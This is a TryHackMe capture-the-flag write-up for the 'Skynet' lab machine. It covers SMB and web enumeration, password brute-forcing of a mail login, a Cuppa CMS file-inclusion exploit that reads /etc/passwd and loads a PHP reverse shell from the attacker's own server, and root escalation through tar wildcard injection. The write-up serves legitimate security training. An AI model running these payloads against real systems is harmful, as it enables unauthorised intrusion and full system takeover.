

![Skynet Logo](https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg)


```
Machine: Skynet
```

```
Task 1: Are you able to compromise this Terminator themed machine?
```
1. What is Miles password for his emails? => cyborg007haloterminator

	1. Run nmap basic scan with -sc flag to see which ports are open nmap -sc $IP -oN casual.txt
	   ```
	    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 11:41 EST
		Nmap scan report for 10.10.188.103
		Host is up (0.42s latency).
		Not shown: 994 closed ports
		PORT    STATE SERVICE
		22/tcp  open  ssh
		| ssh-hostkey: 
		|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
		|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
		|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
		80/tcp  open  http
		|_http-title: Skynet
		110/tcp open  pop3
		|_pop3-capabilities: UIDL PIPELINING TOP SASL AUTH-RESP-CODE CAPA RESP-CODES
		139/tcp open  netbios-ssn
		143/tcp open  imap
		|_imap-capabilities: IMAP4rev1 capabilities OK LOGINDISABLEDA0001 LOGIN-REFERRALS LITERAL+ more IDLE ENABLE SASL-IR post-login listed ID Pre-login have
		445/tcp open  microsoft-ds
		Host script results:
		|_clock-skew: mean: 2h00m05s, deviation: 3h27m51s, median: 4s
		|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
		| smb-os-discovery: 
		|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
		|   Computer name: skynet
		|   NetBIOS computer name: SKYNET\x00
		|   Domain name: \x00
		|   FQDN: skynet
		|_  System time: 2021-02-08T10:42:14-06:00
		| smb-security-mode: 
		|   account_used: guest
		|   authentication_level: user
		|   challenge_response: supported
		|_  message_signing: disabled (dangerous, but default)
		| smb2-security-mode: 
		|   2.02: 
		|_    Message signing enabled but not required
		| smb2-time: 
		|   date: 2021-02-08T16:42:14
		|_  start_date: N/A
		Nmap done: 1 IP address (1 host up) scanned in 90.79 seconds
	   ```
	2. Lets focus on port 445 and try to map smb using smbmap -H $IP and notice we have ```anonymous``` Login
		```
		[+] Guest session       IP: 10.10.188.103:445   Name: 10.10.188.103                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
        ```
    3. Lets connect to the smb using ```anonymous``` user, mount -t cifs //$IP/anonymous /mnt/share we get following files and folder
    	```
    	attention.txt and logs(folder)
    	```
    4. cd logs and there are three log files named log1.txt, log2.txt and log3.txt lets cat them to see what we can get out of them. log1.txt is only populated and it seems they are password strings.
    5. Lets run a Hydra bruteforce on smb using the passwords we got in step #4 using Hydra -l milesdyson -P log1.txt smb://$IP/milesdyson, it got no success.
    6. Lets focus on web-application and bruteforce dirs using gobuster and dirbusters wordlist.```gobuster dir --url http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ```
    	```
    	output
    	http://10.10.188.103/squirrelmail/src/login.php => Intresting
    	```
    7. Lets bruteforce password the login form we found in step #6 using BurpSuite
    8. Finally we found answer to the first question that is 'cyborg007haloterminator'

2. What is the hidden directory? => /45kra24zxs28v3yd
 	1. After login with the password we found in last task we found an email that smb password for 'milesdyson' is ')s{A&2Z=F^n_E.B\`' so lets login into it
 		``` output:
 			└─$ ls -al /mnt/skynet2
 			total 48132
 			drwxr-xr-x 2 root root        0 Sep 17  2019  .
 			drwxr-xr-x 4 root root     4096 Feb  8 12:44  ..
 			-rwxr-xr-x 1 root root 19655446 Sep 17  2019 'Convolutional Neural Networks-CNN.pdf'
 			-rwxr-xr-x 1 root root  5743095 Sep 17  2019 'Improving Deep Neural Networks.pdf'
 			-rwxr-xr-x 1 root root 12927230 Sep 17  2019 'Natural Language Processing-Building Sequence Models.pdf'
 			-rwxr-xr-x 1 root root  4304586 Sep 17  2019 'Neural Networks and Deep Learning.pdf'
 			drwxr-xr-x 2 root root        0 Sep 17  2019  notes
 			-rwxr-xr-x 1 root root  3531427 Sep 17  2019 'Structuring your Machine Learning Project.pdf' ```
 	2. In the notes directory we find a text file called important.txt cat it and its output is
 		```
 		1. Add features to beta CMS /45kra24zxs28v3yd
		2. Work on T-800 Model 101 blueprints
		3. Spend more time with my wife
 		```
 	3. Hidden directory is /45kra24zxs28v3yd

3. What is the vulnerability called when you can include a remote file for malicious purposes? => Remote File Inclusion

4. What is the user flag? => ********************************
	1. Let find sub dirs under the newly found directory in step #2 using gobuster. ```gobuster dir --url http://10.10.143.232/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
		```
		output
		http://10.10.143.232/45kra24zxs28v3yd/administrator/
		```
	2. We find that it is running Cuppa CMS lets use searchsploit to see if there exists a know vulnerability for the same.
	3. cool so we find that it is indeed vulnerable ```Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion``` P.S in other cases it is atmost neccessasory to know the version of the CMS but here we have only one exploit so we will go ahead with this only.
	4. Open the txt file suggested by searchsploit and note down the payloads listed in the file.
	5. Okay so we now know that CMS is vulnerable to RFI lets try to check if it works in our case using curl and following payload
		```
		curl http://10.10.143.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
		Response:
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		sync:x:4:65534:sync:/bin:/bin/sync
		games:x:5:60:games:/usr/games:/usr/sbin/nologin
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        .... 
		```
	6. Now lets try to PWN the machine, I will be using php reverse shell by pentestmonkey you can download it at "https://github.com/pentestmonkey/php-reverse-shell"
	7. we will spwan a local python server and edit the shell file with IP address and Port of our chossing
	8. Lets fire the payload to get a reverse connection ```http://10.10.143.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$IP:8000/rev_shell.php```
	9. we now have the shell and the current user is www-data, no lets stabilize the shell using python -c 'import pty; pty.spawn("/bin/bash")'
	10. We finally get the user flag => ********************************

5. What is the root flag? => ********************************
	1. Lets enum the maching using LinPease and see what it has got us to offer it shows under cron job root is excuting a file whit the name backup.sh owned by milesdyson
		```
		*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
		```
	2. The backup.sh for is only has read persmission ```-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh``` so we can not edit it directly
	3. On checking the file we notice something intresting it performs ```tar cf /home/milesdyson/backups/backup.tgz *``` operation and we can here try to exploit wildcard Injection here. P>S: check this artical for more reference "https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/"
	4. I will now be following John Hammond way on setting setuid on the /bin/bash file to get the root instead of going with msfvenom his YT video link is: "https://www.youtube.com/watch?v=HXikLrFVIXc"
	5. Lets go to /var/www/html as suggested by backup.sh and fire follwoing commad to set setuid on the /bin/bash/ so we can just use simple -p to exclate our priveleges.
	6. lets ls -al /bin/bash and notice the permission we don't have it ```-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash```
	7. Now run the following command one by one and wait for a minute for the cron job to run and then we will see the permissions have changed
		```
		printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
		echo "" > "--checkpoint-action=exec=sh shell.sh"
		echo "" > --checkpoint=1```
	8. Now lets run ls -al /bin/bash and we notice ```-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash``` setuid is sucessfully added now all we need to do is execute /bin/bash -p 
	9. cd /root dir and cat the root.txt file and you have the root flag ********************************
  
  P.S: Would credit the root flag part Mr.John Hammond as his way is way simpler then the one suggested on https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
